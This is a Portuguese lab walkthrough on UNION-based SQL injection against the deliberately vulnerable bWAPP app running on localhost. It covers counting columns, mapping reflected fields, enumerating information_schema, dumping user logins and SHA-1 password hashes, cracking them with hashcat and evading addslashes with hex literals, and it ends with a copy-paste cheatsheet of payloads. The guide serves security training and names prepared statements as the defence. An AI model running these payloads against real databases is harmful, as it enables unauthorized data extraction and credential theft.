# SQL Injection UNION-based — Técnica Completa
### Walkthrough no bWAPP com enumeração do `information_schema`

> Pré-requisito: você já sabe detectar uma injeção e mapear o contexto (aspa simples, comentário `-- -`, query LIKE). Se não sabe, volte ao `guia_sqli.md` seções 3 e 4 antes de continuar. Este documento parte do ponto em que você confirmou que o parâmetro é injetável.

**Alvo principal:** `http://localhost/sqli_1.php` — query `SELECT * FROM movies WHERE title LIKE '%<INPUT>%'` — nível de segurança `low`.

---

## Sumário

1. [O que é UNION-based e por que ela domina](#1-o-que-é-union-based-e-por-que-ela-domina)
2. [Pré-requisitos para o UNION funcionar](#2-pré-requisitos-para-o-union-funcionar)
3. [Passo 1 — Descobrindo o número de colunas com ORDER BY](#3-passo-1--descobrindo-o-número-de-colunas-com-order-by)
4. [Passo 2 — Confirmando com UNION SELECT NULL](#4-passo-2--confirmando-com-union-select-null)
5. [Passo 3 — Mapeando as colunas refletidas](#5-passo-3--mapeando-as-colunas-refletidas)
6. [Passo 4 — Reconhecimento básico do servidor](#6-passo-4--reconhecimento-básico-do-servidor)
7. [Passo 5 — Enumeração completa do information_schema](#7-passo-5--enumeração-completa-do-information_schema)
8. [Truques essenciais para extração eficiente](#8-truques-essenciais-para-extração-eficiente)
9. [Bypass no level medium (addslashes)](#9-bypass-no-level-medium-addslashes)
10. [Pegadinhas comuns](#10-pegadinhas-comuns)
11. [Cheatsheet final](#11-cheatsheet-final)

---

## 1. O que é UNION-based e por que ela domina

O operador `UNION` no SQL junta os resultados de duas queries `SELECT` em uma única resposta. Normalmente ele serve para consultas legítimas. Na exploração, você o usa para **annexar uma segunda query inteiramente sua** ao resultado da query original.

A query original no servidor é algo como:

```sql
SELECT id, title, release, character, genre, director, imdb_url
FROM movies
WHERE title LIKE '%iron%'
```

Quando você injeta `iron' UNION SELECT 1,2,3,4,5,6,7 -- -`, o servidor executa:

```sql
SELECT id, title, release, character, genre, director, imdb_url
FROM movies
WHERE title LIKE '%iron%'
UNION
SELECT 1,2,3,4,5,6,7
```

O banco retorna as linhas dos filmes **mais** a sua linha extra `1,2,3,4,5,6,7`. O PHP lê tudo isso e imprime na tela. Onde antes aparecia um título de filme, agora você pode colocar `version()`, `database()`, ou o conteúdo de qualquer tabela.

**Por que UNION é a técnica preferida quando funciona?**

- **Velocidade:** você vê o resultado na resposta HTTP imediata, sem precisar inferir bit por bit.
- **Completude:** dá pra extrair múltiplas colunas de uma vez, e com `GROUP_CONCAT` você despeja uma tabela inteira em uma única requisição.
- **Previsibilidade:** o payload é determinístico — você sabe exatamente o que vai aparecer e onde.

Blind SQLi (boolean ou time-based) é o plano B quando a aplicação não reflete dados. UNION é o plano A. Se você consegue usar UNION, use — é noite e dia em termos de eficiência.

---

## 2. Pré-requisitos para o UNION funcionar

Antes de sair injetando, entenda as três condições que o banco impõe para o `UNION` ser válido:

### 2.1 Mesmo número de colunas

As duas queries unidas precisam retornar exatamente o mesmo número de colunas. Se a query original retorna 7 colunas, a sua também precisa ter 7. Qualquer diferença resulta em:

```
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

Isso não é uma limitação do bWAPP — é o padrão SQL. Você vai ter que descobrir o número de colunas antes de construir qualquer payload UNION útil.

### 2.2 Tipos de dados compatíveis em cada posição

Cada coluna da sua query precisa ter um tipo compatível com a coluna correspondente na query original. Na prática isso é mais relaxado do que parece — MySQL/MariaDB faz cast automático na maioria dos casos. A exceção é quando uma coluna original tem charset/collation muito restrito (BINARY, por exemplo), o que pode gerar erro de collation.

A solução universal: use `NULL` nas posições que não precisam refletir. `NULL` não tem tipo e nunca causa conflito.

### 2.3 A aplicação precisa imprimir o resultado

Se o PHP faz a query mas não imprime os dados em lugar nenhum visível, UNION não serve — você injeta, o banco executa, mas você não vê nada. Isso é o que diferencia UNION-based de blind: o canal de saída precisa existir.

No `sqli_1.php` isso está garantido: o script imprime os resultados da busca numa tabela HTML. Se não houvesse impressão, você precisaria de boolean-based ou time-based.

---

## 3. Passo 1 — Descobrindo o número de colunas com ORDER BY

`ORDER BY N` aceita um número inteiro que representa a posição da coluna pelo qual ordenar. Se você mandar `ORDER BY 7` e a query só tiver 5 colunas, o banco retorna:

```
Unknown column '7' in 'order clause'
```

Esse erro é o seu medidor. Você incrementa o número até conseguir esse erro, e o número imediatamente anterior é a contagem de colunas.

### Sequência de payloads para sqli_1.php

```
iron' ORDER BY 1 -- -
iron' ORDER BY 2 -- -
iron' ORDER BY 3 -- -
iron' ORDER BY 4 -- -
iron' ORDER BY 5 -- -
iron' ORDER BY 6 -- -
iron' ORDER BY 7 -- -
iron' ORDER BY 8 -- -    ← erro aqui
```

`ORDER BY 7` retorna página normal (filmes aparecem). `ORDER BY 8` retorna erro SQL. Conclusão: **7 colunas**.

> 💡 **Por que `iron'` e não só `'`?** Para garantir que você começa com ao menos uma linha de resultado. Se a query retornar zero linhas, qualquer ORDER BY vai parecer funcionar (não tem nada pra ordenar e não quebra). Com `iron` você tem resultados reais e a diferença entre "funcionou" e "deu erro" fica clara.

> 💡 **Busca binária para otimizar:** se suspeitar que são muitas colunas, não precisa testar 1, 2, 3... Tente `ORDER BY 10`. Se funcionar, tente 20. Se der erro, tente 15. Cada teste elimina metade do espaço de busca. Para uma query com 20 colunas, você chega em 5 requisições em vez de 20.

> ⚠️ **Cuidado com erro suprimido:** se a aplicação suprimir erros SQL (HTTP 500 sem mensagem, ou simplesmente página em branco), você não vai ver o erro de ORDER BY. Nesse caso vá direto para UNION SELECT NULL incrementando o número de NULLs. Mais lento, mas funciona.

---

## 4. Passo 2 — Confirmando com UNION SELECT NULL

Agora que sabe que são 7 colunas, confirme que o UNION em si funciona:

```
a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL -- -
```

Note que mudei o prefixo de `iron` para `a` — quero que a parte antes do UNION retorne zero resultados (sem filmes com título `a`), para que a única linha visível seja a minha. Com `iron` funcionaria também, mas a tabela ficaria poluída com os filmes reais.

**O que esperar:** a página carrega sem erro. Pode aparecer uma linha extra em branco na tabela de filmes (ou completamente invisível, dependendo de como o PHP renderiza NULLs). O importante é que não aparece mensagem de erro.

**Se aparecer erro de "different number of columns":** você contou errado no passo anterior. Volte ao ORDER BY e repita com mais cuidado.

**Por que NULL e não `1,2,3,...`?**

| Opção | Comportamento |
|-------|---------------|
| `NULL` | Sem tipo, converte pra qualquer coisa, nunca quebra por tipo |
| `1,2,3,4,5,6,7` | Pode quebrar se alguma coluna original for BINARY ou tiver collation incompatível com inteiro |
| `'a','b','c',...` | Pode quebrar se alguma coluna original for numérica e o banco estiver em modo strict |

NULL é universal. Use-o na fase de confirmação. Troque por valores úteis só quando for extrair dados.

---

## 5. Passo 3 — Mapeando as colunas refletidas

UNION funciona, mas você ainda não sabe quais das 7 colunas aparecem no HTML. O PHP quase certamente não imprime todas. Para descobrir, substitua os NULLs por números identificáveis:

```
a' UNION SELECT 1,2,3,4,5,6,7 -- -
```

Agora inspecione a resposta HTML (no Burp, aba Response → Raw). Procure pelos números literais `1`, `2`, `3`... dentro das tags da tabela de filmes.

**Resultado no bWAPP sqli_1.php:**

| Número no payload | Onde aparece no HTML |
|-------------------|----------------------|
| `1` | Não aparece (coluna `id`, oculta) |
| `2` | Coluna "Title" |
| `3` | Coluna "Release" |
| `4` | Coluna "Character" |
| `5` | Coluna "Genre" |
| `6` | Não aparece |
| `7` | Não aparece |

As colunas **2, 3, 4 e 5** são sua "janela" pra exfiltrar dados. As colunas 1, 6 e 7 existem na query mas o PHP as ignora — não desperdiçe esforço pondo dados ali.

> ⚠️ **Cuidado com tipos nessa etapa:** se ao trocar NULL por número inteiro alguma coluna der erro de tipo, mantenha NULL naquela posição e ponha número só nas outras. Mas no bWAPP `low` isso não acontece — todos os campos aceitam inteiro normalmente.

---

## 6. Passo 4 — Reconhecimento básico do servidor

Antes de mergulhar no `information_schema`, colete o contexto do banco em uma requisição só. Você tem 4 colunas refletidas — use todas:

```
a' UNION SELECT 1,version(),database(),user(),@@hostname,6,7 -- -
```

**O que você vai ver no bWAPP:**

| Coluna refletida | Função | Valor típico |
|------------------|--------|--------------|
| Coluna 2 (Title) | `version()` | `10.6.x-MariaDB` |
| Coluna 3 (Release) | `database()` | `bWAPP` |
| Coluna 4 (Character) | `user()` | `root@%` |
| Coluna 5 (Genre) | `@@hostname` | `<id do container Docker>` |

**Por que isso importa antes de enumerar?**

- `database()` confirma em qual banco você está — economiza um passo na enumeração de schemas.
- `user()` diz seus privilégios. `root@%` significa acesso total a todos os bancos, incluindo `mysql`. Com usuário restrito você talvez não consiga ler certas tabelas do `information_schema`.
- `version()` confirma que é MariaDB — a sintaxe do `information_schema` é idêntica ao MySQL, então não muda nada aqui, mas em SQLite ou PostgreSQL seria diferente.

---

## 7. Passo 5 — Enumeração completa do information_schema

Esta é a seção principal. O `information_schema` é o **catálogo de metadados** do MySQL/MariaDB: um banco especial, somente leitura, que descreve toda a estrutura do servidor — quais bancos existem, quais tabelas há em cada banco, quais colunas há em cada tabela, quais índices, stored procedures, permissões de usuário. É o mapa que você precisa antes de saber onde cavar.

### 7.0 Tabelas-chave do information_schema

| Tabela | O que contém |
|--------|--------------|
| `schemata` | Lista de todos os bancos (schemas) |
| `tables` | Lista de todas as tabelas, com qual banco pertencem |
| `columns` | Lista de todas as colunas, com tipo, tabela e banco |
| `user_privileges` | Privilégios dos usuários do banco |
| `routines` | Stored procedures e functions definidas |

Você vai usar `schemata`, `tables` e `columns` em 99% dos casos. As outras são bônus.

### 7.1 Listando todos os bancos disponíveis

```
a' UNION SELECT 1,GROUP_CONCAT(schema_name SEPARATOR ','),3,4,5,6,7 FROM information_schema.schemata -- -
```

**Resultado esperado no bWAPP:**

```
information_schema,bWAPP,mysql,performance_schema,sys
```

Isso aparece na coluna "Title" da tabela HTML — uma string única com todos os bancos separados por vírgula.

Por que `GROUP_CONCAT` e não `schema_name` direto? Porque a query original retorna uma linha por banco, mas o bWAPP (como muitas aplicações reais) só imprime o primeiro resultado quando a query retorna múltiplas linhas. `GROUP_CONCAT` colapsa todas as linhas em uma string só — você extrai tudo em uma requisição.

O banco que interessa é `bWAPP`. Os outros são infraestrutura do MySQL/MariaDB.

### 7.2 Listando tabelas do banco bWAPP

```
a' UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR ','),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database() -- -
```

Note o uso de `database()` em vez de `'bWAPP'` com aspas — menos um caractere especial, funciona em qualquer contexto, e já sabemos que o banco atual é bWAPP.

**Resultado esperado:**

```
blog,heroes,movies,users,visitors
```

🎯 A tabela `users` aparece. Ela é o alvo. As outras podem conter dados interessantes também (`heroes` tem credenciais de personagens fictícios, `blog` tem posts), mas `users` é onde estão os logins reais da aplicação.

### 7.3 Listando colunas da tabela users

Agora você sabe que `users` existe. Antes de extrair, você precisa saber os nomes exatos das colunas:

```
a' UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR ','),3,4,5,6,7 FROM information_schema.columns WHERE table_schema=database() AND table_name='users' -- -
```

**Resultado esperado:**

```
id,login,password,email,secret,activation_code,activated,reset_code,admin
```

Guarde esses nomes. Você vai precisar deles no próximo passo. O que chama atenção:

- `login` e `password` — credenciais de acesso
- `secret` — provavelmente resposta a pergunta de segurança
- `admin` — flag booleana indicando se o usuário é administrador
- `activation_code` e `reset_code` — tokens de processo de cadastro/recuperação de senha

### 7.4 Extraindo dados da tabela users

Com schema mapeado, a extração é direta:

```
a' UNION SELECT 1,GROUP_CONCAT(login,0x3a,password SEPARATOR 0x0a),3,4,5,6,7 FROM users -- -
```

Decodificando o payload:
- `login,0x3a,password` — concatena `login`, o caractere `:` (hex `3a`), e `password` para cada linha
- `SEPARATOR 0x0a` — usa newline (`0a` = LF) para separar usuários diferentes

**Resultado esperado no bWAPP:**

```
bee:6885858486f31043e5839c735d99457f045affd0
A.I.M.:40b244aa2a20a02aa9e3aa5426a0d8dbfc36d513
```

O hash `6885858486f31043e5839c735d99457f045affd0` é SHA-1 da string `bug` (senha do usuário `bee`). SHA-1 sem salt é trivial de quebrar com qualquer wordlist moderna — `hashcat -m 100 hashes.txt rockyou.txt` faz isso em segundos.

Para extrair colunas adicionais, como o campo `secret` e o flag `admin`:

```
a' UNION SELECT 1,GROUP_CONCAT(login,0x3a,password,0x3a,secret,0x3a,admin SEPARATOR 0x0a),3,4,5,6,7 FROM users -- -
```

Você verá algo como:

```
bee:6885858486f31043e5839c735d99457f045affd0:Any bugs?:1
A.I.M.:40b244aa2a20a02aa9e3aa5426a0d8dbfc36d513:...:0
```

O `admin=1` confirma que `bee` é admin. Informação útil no relatório de pentest: você demonstrou extração completa de credenciais privilegiadas, não apenas dados genéricos.

### 7.5 Extraindo dados de outras tabelas — heroes

Para completar a enumeração, faça o mesmo com `heroes`:

```
a' UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR ','),3,4,5,6,7 FROM information_schema.columns WHERE table_schema=database() AND table_name='heroes' -- -
```

Resultado: `id,login,password,secret`. Mesma estrutura. Extração:

```
a' UNION SELECT 1,GROUP_CONCAT(login,0x3a,password SEPARATOR 0x0a),3,4,5,6,7 FROM heroes -- -
```

---

## 8. Truques essenciais para extração eficiente

### 8.1 GROUP_CONCAT — por que é indispensável

A maioria das aplicações reais só renderiza a primeira linha do resultado. Se você não usar `GROUP_CONCAT`, vai extrair um banco por vez, uma tabela por vez, um usuário por vez. Com `GROUP_CONCAT` você colapsa tudo em uma linha.

```sql
-- Sem GROUP_CONCAT: só retorna o primeiro banco
SELECT schema_name FROM information_schema.schemata

-- Com GROUP_CONCAT: retorna todos de uma vez
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata
```

### 8.2 Separadores customizados com hex

Quando você precisa de um separador específico nos dados, use hex em vez de string entre aspas (economiza aspas, facilita bypass):

| Caractere | Hex | Uso |
|-----------|-----|-----|
| `:` | `0x3a` | Separar campo:valor |
| `\n` (newline) | `0x0a` | Separar registros |
| `~` | `0x7e` | Marcador visual fácil de identificar |
| `\|` | `0x7c` | Separador tipo CSV alternativo |

Exemplo combinando múltiplos separadores:

```
GROUP_CONCAT(login,0x3a,password,0x3a,email SEPARATOR 0x7c)
```

Resultado: `bee:hash:bee@bwapp.com|admin:hash:admin@example.com`

### 8.3 Hex literal em vez de string — bypass de aspas filtradas

Quando o filtro escapa aspas simples, você não pode escrever `'bWAPP'` ou `'users'`. Use o valor em hex:

```bash
# No terminal, converta qualquer string para hex:
echo -n 'bWAPP' | xxd -p    # → 6257415050
echo -n 'users' | xxd | awk '{print $2$3$4$5$6$7$8$9}' | tr -d '\n'
# Forma mais simples:
python3 -c "print('users'.encode().hex())"   # → 7573657273
```

No payload, prefixe com `0x`:

```
-- Em vez de WHERE table_name='users'
WHERE table_name=0x7573657273
```

O banco aceita os dois de forma equivalente. O filtro que bloqueia `'users'` não bloqueia `0x7573657273`.

### 8.4 LIMIT quando GROUP_CONCAT estoura

`GROUP_CONCAT` tem um limite padrão de **1024 caracteres** (`group_concat_max_len`). Se você estiver extraindo muitos dados (lista enorme de tabelas, coluna com texto longo), o resultado pode ser truncado silenciosamente.

Para paginar, use `LIMIT` e `OFFSET` na subquery:

```
a' UNION SELECT 1,GROUP_CONCAT(login,0x3a,password SEPARATOR 0x0a),3,4,5,6,7 FROM (SELECT login,password FROM users LIMIT 10 OFFSET 0) AS t -- -

-- Próxima página:
a' UNION SELECT 1,GROUP_CONCAT(login,0x3a,password SEPARATOR 0x0a),3,4,5,6,7 FROM (SELECT login,password FROM users LIMIT 10 OFFSET 10) AS t -- -
```

Ou se tiver acesso (e o filtro não bloquear), você pode aumentar o limite diretamente:

```
a' UNION SELECT 1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),3,4,5,6,7 -- -
```

Isso não muda o limite, mas colocar a subquery inline às vezes resolve problemas de escopo em filtros específicos.

### 8.5 CONCAT_WS como alternativa ao GROUP_CONCAT

`CONCAT_WS(separador, val1, val2, ...)` concatena valores com separador automático, ignorando NULLs:

```sql
-- GROUP_CONCAT (colapsa múltiplas linhas):
GROUP_CONCAT(login,0x3a,password)

-- CONCAT_WS (une múltiplas colunas de uma linha, ignorando NULL):
CONCAT_WS(0x3a, login, password, email)
```

Use `CONCAT_WS` quando quiser unir várias colunas de uma mesma linha sem precisar concatenar manualmente. Use `GROUP_CONCAT` quando quiser colapsar múltiplas linhas em uma.

Combinação ideal:

```
GROUP_CONCAT(CONCAT_WS(0x3a, login, password, email) SEPARATOR 0x0a)
```

Resultado limpo: cada linha é `login:senha:email`, separadas por newline.

---

## 9. Bypass no level medium (addslashes)

Troque o Security Level para `medium` e tente mandar qualquer payload com aspa. Você vai ver que a aspa some ou vira `\'` — a função `addslashes()` escapando o input.

### O que addslashes faz e o que não faz

`addslashes()` escapa `'`, `"`, `\` e o byte NUL. Só isso. Não filtra:

- Números
- Funções SQL (`database()`, `version()`, etc.)
- Operadores (`UNION`, `SELECT`, `FROM`, `WHERE`)
- Hex literals (`0x...`)
- Referências a funções internas do banco

### 9.1 sqli_1.php em medium — UNION-based para

A query usa `LIKE '...input...'`. Como agora você não consegue fechar a aspa (ela é escapada), você não consegue injetar `UNION`. Este é exatamente o ponto: para **contexto de string** com escape de aspa, `addslashes` é uma mitigação efetiva contra UNION-based simples.

O que você ainda pode tentar em medium no sqli_1.php:

- Payloads que não dependem de aspa, como:
  ```
  iron%' -- -
  ```
  Mas `%` é literalmente parte do LIKE e não serve pra fechar o contexto.

A conclusão honesta é: UNION-based não funciona em `sqli_1.php` com level medium. Passe para `sqli_2.php`.

### 9.2 sqli_2.php em medium — UNION-based continua funcionando

```php
$sql.= " WHERE id = " . sqli($id);
```

Contexto numérico. A aspa nunca foi necessária. `addslashes` escapa aspa, mas você nem usa aspa — então o filtro é completamente irrelevante aqui.

Todos os payloads funcionam normalmente:

```
0 UNION SELECT 1,2,3,4,5,6,7
0 UNION SELECT 1,version(),database(),user(),@@hostname,6,7
0 UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()
```

Para referenciar strings em `WHERE` (como `table_name='users'`), use hex:

```
0 UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7 FROM information_schema.columns WHERE table_schema=database() AND table_name=0x7573657273
```

`0x7573657273` é `users` em hex. Sem aspas, sem filtro, mesmo resultado.

> 💡 **A lição do level medium:** escape de aspa é defesa para contexto de string. Para contexto numérico, é inútil. Isso é por que prepared statements (que parametrizam o tipo, não só escapam) são a defesa correta — eles funcional em ambos os contextos.

---

## 10. Pegadinhas comuns

### ❌ Esquecer o `-- -` com espaço

```
iron' UNION SELECT 1,2,3,4,5,6,7
```

Sem comentário, a query vira:

```sql
... WHERE title LIKE '%iron' UNION SELECT 1,2,3,4,5,6,7%'
```

O `%'` no final torna a query sintaticamente inválida. Você vai ver erro, acha que o payload não funciona, mas o problema é só o comentário faltando.

Sempre termine com `-- -` (traço-traço-espaço-traço). O traço final é por precaução — algumas implementações exigem que haja algo após o `--` e o espaço para reconhecer como comentário.

### ❌ Contar colunas errado

Se `ORDER BY 7` retorna erro E `ORDER BY 6` funciona, mas você pôs 7 NULLs no UNION, vai ter esse erro:

```
The used SELECT statements have a different number of columns
```

Isso não é o banco te dizendo que injeção não funciona. É ele dizendo que sua contagem está errada. Volte ao ORDER BY, repita com atenção.

### ❌ Colocar dados em colunas que não refletem

Se coluna 1 (id) não aparece no HTML, colocar `version()` ali não vai servir de nada. Você vai olhar a página e não ver nada — e achar que o payload falhou. Sempre use as colunas 2-5 no bWAPP para seus dados.

### ❌ Erro de collation

Raro no bWAPP, mas aparece em aplicações reais com colunas `BINARY` ou `CHARSET=utf8mb4` estrito. Sintoma: UNION SELECT com string dá erro tipo:

```
Illegal mix of collations for operation 'UNION'
```

Solução: force a conversão na sua coluna:

```
a' UNION SELECT 1,CONVERT(version() USING utf8),3,4,5,6,7 -- -
```

### ❌ GROUP_CONCAT truncado silenciosamente

O limite padrão é 1024 chars. Se você extrair uma tabela com muitos usuários e o resultado parecer incompleto (termina no meio de um hash), o GROUP_CONCAT foi cortado. Use `LIMIT`/`OFFSET` para paginar como descrito na seção 8.4.

Você pode confirmar o limite atual do servidor com:

```
a' UNION SELECT 1,@@group_concat_max_len,3,4,5,6,7 -- -
```

Se retornar `1024`, é o padrão — você pode esbarrar no limite em extrações grandes.

### ❌ Time-based dentro de LIKE sem subquery

Não é um erro de UNION-based, mas vale mencionar por ser uma armadilha clássica adjacente: se você testar `SLEEP(3)` em sqli_1.php e ele demorar 21 segundos, é porque a query retornou 7 filmes e o SLEEP executou 7 vezes. Sempre use `IF((SELECT ...), SLEEP(3), 0)` com subquery quando for time-based em contexto LIKE.

---

## 11. Cheatsheet final

Todos os payloads canônicos do walkthrough, prontos para copiar e colar no Burp Repeater. Prefixo `a'` assume contexto de string; adapte para numérico se necessário.

```sql
-- ============================================================
-- FASE 1: CONTAGEM DE COLUNAS
-- ============================================================

-- Incrementar N até dar erro (busca linear):
iron' ORDER BY 1 -- -
iron' ORDER BY 7 -- -
iron' ORDER BY 8 -- -    ← erro = 7 colunas

-- Busca binária (mais rápido para N desconhecido):
iron' ORDER BY 10 -- -
iron' ORDER BY 5 -- -
iron' ORDER BY 7 -- -


-- ============================================================
-- FASE 2: CONFIRMAÇÃO E MAPEAMENTO DE COLUNAS REFLETIDAS
-- ============================================================

-- Confirmar número de colunas com NULL (sem erro de tipo):
a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL -- -

-- Mapear quais colunas refletem no HTML:
a' UNION SELECT 1,2,3,4,5,6,7 -- -


-- ============================================================
-- FASE 3: RECONHECIMENTO DO SERVIDOR
-- ============================================================

a' UNION SELECT 1,version(),database(),user(),@@hostname,6,7 -- -


-- ============================================================
-- FASE 4: ENUMERAÇÃO DO information_schema
-- ============================================================

-- Listar todos os bancos:
a' UNION SELECT 1,GROUP_CONCAT(schema_name SEPARATOR ','),3,4,5,6,7 FROM information_schema.schemata -- -

-- Listar tabelas do banco atual:
a' UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR ','),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database() -- -

-- Listar tabelas de banco específico (sem aspa, usando database()):
a' UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR ','),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database() -- -

-- Listar tabelas de banco por nome com hex (quando aspa filtrada):
-- hex de 'bWAPP' = 0x6257415050
a' UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR ','),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=0x6257415050 -- -

-- Listar colunas de uma tabela (com nome em hex: 'users' = 0x7573657273):
a' UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR ','),3,4,5,6,7 FROM information_schema.columns WHERE table_schema=database() AND table_name=0x7573657273 -- -

-- Listar colunas com aspa (quando não há filtro):
a' UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR ','),3,4,5,6,7 FROM information_schema.columns WHERE table_schema=database() AND table_name='users' -- -


-- ============================================================
-- FASE 5: EXTRAÇÃO DE DADOS
-- ============================================================

-- Extrair login e password (separador : entre campos, newline entre linhas):
a' UNION SELECT 1,GROUP_CONCAT(login,0x3a,password SEPARATOR 0x0a),3,4,5,6,7 FROM users -- -

-- Extrair múltiplas colunas com CONCAT_WS:
a' UNION SELECT 1,GROUP_CONCAT(CONCAT_WS(0x3a,login,password,email,admin) SEPARATOR 0x0a),3,4,5,6,7 FROM users -- -

-- Extrair com paginação (quando GROUP_CONCAT estourar 1024 chars):
a' UNION SELECT 1,GROUP_CONCAT(login,0x3a,password SEPARATOR 0x0a),3,4,5,6,7 FROM (SELECT login,password FROM users LIMIT 10 OFFSET 0) AS t -- -


-- ============================================================
-- TRUQUES DE BYPASS (level medium / filtros de aspa)
-- ============================================================

-- Contexto numérico (sqli_2.php): sem aspa, direto:
0 UNION SELECT 1,version(),database(),user(),@@hostname,6,7

-- Hex para strings sem aspa:
0 UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=0x6257415050

-- Conversão de string para hex no terminal:
-- echo -n 'users' | xxd -p          → 7573657273    → use como 0x7573657273
-- python3 -c "print('users'.encode().hex())"  → mesmo resultado


-- ============================================================
-- DIAGNÓSTICO
-- ============================================================

-- Verificar limite do GROUP_CONCAT:
a' UNION SELECT 1,@@group_concat_max_len,3,4,5,6,7 -- -

-- Verificar data directory (pode indicar SO e estrutura):
a' UNION SELECT 1,@@datadir,3,4,5,6,7 -- -

-- Verificar variáveis de segurança:
a' UNION SELECT 1,@@secure_file_priv,3,4,5,6,7 -- -
```

---

**Você dominou UNION-based quando consegue, sem consultar este guia: detectar injeção → contar colunas → mapear reflexão → extrair credenciais completas da tabela `users` — tudo em menos de 15 minutos e sem usar SQLMap.**

O próximo passo natural é Error-based (quando UNION não é viável mas erros aparecem na tela) e Boolean-blind (quando não há reflexão de dados nem erros). Esses cenários estão cobertos no `guia_sqli.md` seções 7 e 8.
